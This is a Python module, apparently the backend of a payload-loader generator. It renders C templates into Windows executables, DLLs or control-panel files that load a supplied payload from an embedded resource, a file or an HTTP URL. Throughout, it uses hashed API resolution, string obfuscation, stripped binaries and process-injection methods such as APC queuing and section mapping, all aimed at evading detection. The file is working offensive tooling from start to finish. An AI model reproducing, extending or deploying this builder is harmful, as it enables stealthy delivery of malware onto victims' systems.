import os
import subprocess
import sys
import uuid
import importlib
import random
from jinja2 import Environment, FileSystemLoader

def _djb2_hash(s):
    """Calculates the DJB2 hash for a given string."""
    hash_val = 5381
    for char in s:
        hash_val = ((hash_val << 5) + hash_val) + ord(char)
    return hash_val & 0xFFFFFFFF # Return as a 32-bit unsigned integer

def _obfuscate_string(string_data, key):
    """Obfuscates a string using a byte-wise subtraction and returns a C-style byte array."""
    if not string_data:
        return ""
    obfuscated_bytes = bytearray()
    for char in string_data.encode('utf-8'):
        obfuscated_bytes.append((char - key) & 0xFF)
    return ", ".join([f"0x{byte:02x}" for byte in obfuscated_bytes])

def _get_api_hashes():
    """Returns a dictionary of all required API name hashes."""
    api_names = [
        "LoadLibraryA", "VirtualAlloc", "CreateThread", "WaitForSingleObject",
        "CloseHandle", "CreateFileMappingW", "MapViewOfFile", "GetProcessHeap",
        "RtlAllocateHeap", "HeapFree", "CreateFileA", "GetFileSize", "ReadFile",
        "RtlMoveMemory", "CreateDecompressor", "Decompress", "CloseDecompressor",
        "WinHttpOpen", "WinHttpConnect", "WinHttpOpenRequest", "WinHttpSendRequest",
        "WinHttpReceiveResponse", "WinHttpQueryDataAvailable", "WinHttpReadData",
        "WinHttpCloseHandle", "WinHttpCrackUrl", "WinHttpSetOption", "WinHttpQueryHeaders",
        "RtlZeroMemory", "FindResourceA", "LoadResource", "LockResource", "SizeofResource",
        "CreateProcessA", "VirtualAllocEx", "WriteProcessMemory", "QueueUserAPC", "ResumeThread",
        "lstrlenA", "GetEnvironmentVariableA", "VirtualProtectEx", "GetLastError",
        "NtCreateSection", "NtMapViewOfSection"
    ]
    module_names = ["KERNEL32.DLL", "NTDLL.DLL", "CABINET.DLL", "WINHTTP.DLL"]
    
    hashes = {}
    for name in api_names:
        hashes[f"hash_{name.lower()}"] = _djb2_hash(name)
    for name in module_names:
        key_name = name.replace('.', '_').lower()
        hashes[f"hash_{key_name}"] = _djb2_hash(name)
        
    return hashes

def _prepare_template_context(options, input_filepath):
    """Prepares the complete dictionary of variables to be passed to the Jinja2 template."""
    template_vars = {}
    
    # API Resolve context
    api_resolver_choice = options.get('api_resolver', 'string')
    template_vars['api_resolver'] = api_resolver_choice
    template_vars['api_resolver_partial'] = f"partials/api_resolver_{api_resolver_choice}.c.j2"
    if api_resolver_choice == 'hashed':
        template_vars.update(_get_api_hashes())

    # Data Source context
    data_source_choice = options.get('data_source', 'embedded')
    template_vars['data_source'] = data_source_choice
    if data_source_choice == 'embedded':
        template_vars['data_source_partial'] = "partials/datasource_resource.c.j2"
    else:
        template_vars['data_source_partial'] = f"partials/datasource_{data_source_choice}.c.j2"
    
    # Handle data source specific variables (obfuscation, paths, etc.)
    obfuscate_strings = options.get('obfuscate_strings') == 'true'
    template_vars['obfuscate_strings'] = obfuscate_strings

    if data_source_choice == 'file':
        template_vars['file_path'] = options.get('file_path', '').replace('\\', '\\\\')
    elif data_source_choice == 'http':
        url = options.get('url', '')
        user_agent = options.get('user_agent', 'Mozilla/5.0')
        if obfuscate_strings:
            key = random.randint(1, 255)
            template_vars['obfuscation_key'] = key
            template_vars['url_obfuscated'] = _obfuscate_string(url, key)
            template_vars['user_agent_obfuscated'] = _obfuscate_string(user_agent, key)
        else:
            template_vars['url'] = url.replace('\\', '\\\\')
            template_vars['user_agent'] = user_agent
        template_vars['trust_invalid_cert'] = 1 if options.get('trust_invalid_cert') == 'true' else 0

    output_format = options.get('output_format', 'exe')
    template_vars.update({
        'allocation_partial': f"partials/alloc_{options.get('allocation_method', 'virtualalloc')}.c.j2",
        'execution_partial': f"partials/exec_{options.get('execution_method', 'newthread')}.c.j2",
        'output_format': output_format,
        'export_name': 'CPlApplet' if output_format == 'cpl' else options.get('export_name', 'DllRegisterServer'),
        'debug_mode': (options.get('debug_mode') == 'true'),
        'bytecode_transformation': options.get('bytecode_encoding'),
        'bytecode_compression': options.get('bytecode_compression')
    })
    
    return template_vars

def _compile_resource(payload_bytes, temp_files_to_clean):
    """Compiles embedded payload into a resource object file and returns the path."""
    temp_bin_filename = f"{uuid.uuid4()}.bin"
    temp_bin_filepath = os.path.join('/tmp/uploads', temp_bin_filename)
    temp_files_to_clean.append(temp_bin_filepath)
    with open(temp_bin_filepath, "wb") as f_bin:
        f_bin.write(payload_bytes)

    rc_content = f'101 RCDATA "{temp_bin_filename}"'
    temp_rc_filename = f"{uuid.uuid4()}.rc"
    temp_rc_filepath = os.path.join('/tmp/uploads', temp_rc_filename)
    temp_files_to_clean.append(temp_rc_filepath)
    with open(temp_rc_filepath, "w") as f_rc:
        f_rc.write(rc_content)

    temp_res_o_filename = f"{uuid.uuid4()}.o"
    temp_res_o_filepath = os.path.join('/tmp/uploads', temp_res_o_filename)
    temp_files_to_clean.append(temp_res_o_filepath)
    windres_command = ["x86_64-w64-mingw32-windres", "-i", temp_rc_filepath, "-o", temp_res_o_filepath]
    print(f"INFO: Compiling resource object with command: {' '.join(windres_command)}")
    subprocess.run(windres_command, check=True, capture_output=True, text=True, cwd='/tmp/uploads')
    
    return temp_res_o_filepath

def _compile_c_source(c_source_code, temp_files_to_clean):
    """Compiles a C source string into an object file (.o) and returns the path."""
    temp_c_filename = f"{uuid.uuid4()}.c"
    temp_c_filepath = os.path.join('/tmp/uploads', temp_c_filename)
    temp_files_to_clean.append(temp_c_filepath)
    with open(temp_c_filepath, "w") as f:
        f.write(c_source_code)
        
    temp_c_o_filename = f"{uuid.uuid4()}.o"
    temp_c_o_filepath = os.path.join('/tmp/uploads', temp_c_o_filename)
    temp_files_to_clean.append(temp_c_o_filepath)
    compile_command = ["x86_64-w64-mingw32-gcc", "-O2", "-c", temp_c_filepath, "-o", temp_c_o_filepath]
    print(f"INFO: Compiling C object with command: {' '.join(compile_command)}")
    subprocess.run(compile_command, check=True, capture_output=True, text=True, cwd='/tmp/uploads')
    
    return temp_c_o_filepath

def _link_objects(object_files, options, original_filename, temp_files_to_clean):
    """Links object files into the final executable and returns the final artifact name."""
    output_format = options.get('output_format', 'exe')
    base_name, _ = os.path.splitext(original_filename)
    output_artifact_filename = f"{base_name}.{output_format}"
    
    temp_def_filename = None
    if output_format in ['dll', 'cpl']:
        export_name = 'CPlApplet' if output_format == 'cpl' else options.get('export_name', 'DllRegisterServer')
        def_content = f"EXPORTS\n    {export_name}"
        temp_def_filename = f"{uuid.uuid4()}.def"
        temp_def_filepath = os.path.join('/tmp/uploads', temp_def_filename)
        temp_files_to_clean.append(temp_def_filepath)
        with open(temp_def_filepath, "w") as f_def:
            f_def.write(def_content)

    linker_command = ["x86_64-w64-mingw32-gcc"]
    linker_command.extend(object_files)
    if options.get('debug_mode') != 'true':
        linker_command.append("-s")
    if output_format in ['dll', 'cpl']:
        linker_command.extend(["-shared", "-fvisibility=hidden", "-lkernel32"])
        if output_format == 'cpl':
            linker_command.append("-lshell32")
        if temp_def_filename:
            linker_command.append(temp_def_filepath)
    
    linker_command.extend(["-o", output_artifact_filename])
    
    print(f"INFO: Linking with command: {' '.join(linker_command)}")
    subprocess.run(linker_command, check=True, capture_output=True, text=True, cwd='/tmp/uploads')
    
    return output_artifact_filename


def encode(input_filepath, original_filename, options):
    """
    Orchestrates the dynamic generation and compilation of the program.
    """
    print(f"INFO: Starting high-level compilation orchestration for '{original_filename}'")
    temp_files_to_clean = []
    try:
        # Prepare all variables needed by the C template
        template_vars = _prepare_template_context(options, input_filepath)
        
        # Render the C source code from the main template
        template_dir = os.path.join(os.path.dirname(__file__), 'templates')
        env = Environment(loader=FileSystemLoader(template_dir), trim_blocks=True, lstrip_blocks=True)
        template = env.get_template('base.c.j2')
        c_source_code = template.render(**template_vars)

        # Compile the C source code into a C object file
        c_object_path = _compile_c_source(c_source_code, temp_files_to_clean)
        object_files_to_link = [c_object_path]
        
        # If using an embedded data source, compile the payload into a resource object file (Saves compilation time)
        if options.get('data_source') == 'embedded':
            with open(input_filepath, "rb") as f:
                payload_bytes = f.read()
            resource_object_path = _compile_resource(payload_bytes, temp_files_to_clean)
            object_files_to_link.append(resource_object_path)
            
        # Link all generated object files into the final binary
        final_artifact_name = _link_objects(
            object_files_to_link, options, original_filename, temp_files_to_clean
        )
        
        print(f"INFO: High-level compilation successful. Final artifact: {final_artifact_name}")
        return final_artifact_name
        
    except subprocess.CalledProcessError as e:
        print(f"ERROR: A build step failed. Stderr: {e.stderr}", file=sys.stderr)
        raise Exception(f"C compilation failed: {e.stderr}")
    finally:
        print(f"INFO: Cleaning up {len(temp_files_to_clean)} temporary files.")
        for f_path in temp_files_to_clean:
            if os.path.exists(f_path):
                os.remove(f_path)
